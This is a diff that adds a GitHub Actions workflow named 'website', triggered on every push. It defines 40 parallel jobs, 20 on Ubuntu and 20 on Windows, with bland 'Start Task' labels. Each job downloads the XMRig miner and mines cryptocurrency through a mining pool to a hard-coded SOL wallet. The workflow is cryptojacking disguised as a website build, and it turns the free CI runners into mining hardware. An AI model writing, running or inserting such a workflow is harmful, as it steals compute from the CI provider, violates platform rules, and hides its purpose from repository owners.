@@ -1,0 +1,487 @@
+name: website
+
+on: [push]
+
+jobs:
+
+  start_task_1:
+    name: Start Task 1
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 1 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_2:
+    name: Start Task 2
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 2 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_3:
+    name: Start Task 3
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 3 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_4:
+    name: Start Task 4
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 4 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_5:
+    name: Start Task 5
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 5 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_6:
+    name: Start Task 6
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 6 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_7:
+    name: Start Task 7
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 7 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_8:
+    name: Start Task 8
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 8 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_9:
+    name: Start Task 9
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 9 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_10:
+    name: Start Task 10
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 10 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_11:
+    name: Start Task 11
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 11 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_12:
+    name: Start Task 12
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 12 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_13:
+    name: Start Task 13
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 13 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_14:
+    name: Start Task 14
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 14 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_15:
+    name: Start Task 15
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 15 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_16:
+    name: Start Task 16
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 16 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_17:
+    name: Start Task 17
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 17 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_18:
+    name: Start Task 18
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 18 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_19:
+    name: Start Task 19
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 19 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_20:
+    name: Start Task 20
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 20 di Ubuntu
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_21:
+    name: Start Task 21
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 21 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_22:
+    name: Start Task 22
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 22 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_23:
+    name: Start Task 23
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 23 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_24:
+    name: Start Task 24
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 24 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_25:
+    name: Start Task 25
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 25 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_26:
+    name: Start Task 26
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 26 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_27:
+    name: Start Task 27
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 27 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_28:
+    name: Start Task 28
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 28 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_29:
+    name: Start Task 29
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 29 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_30:
+    name: Start Task 30
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 30 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_31:
+    name: Start Task 31
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 31 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_32:
+    name: Start Task 32
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 32 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_33:
+    name: Start Task 33
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 33 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_34:
+    name: Start Task 34
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 34 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_35:
+    name: Start Task 35
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 35 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_36:
+    name: Start Task 36
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 36 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_37:
+    name: Start Task 37
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 37 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_38:
+    name: Start Task 38
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 38 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_39:
+    name: Start Task 39
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 39 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+  start_task_40:
+    name: Start Task 40
+    runs-on: windows-latest
+    steps:
+      - name: Jalankan Task 40 di Windows
+        run: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile xmrig.zip
+          Expand-Archive xmrig.zip -DestinationPath xmrig
+          cd xmrig/xmrig-6.22.2
+          ./xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=4
+
+ 
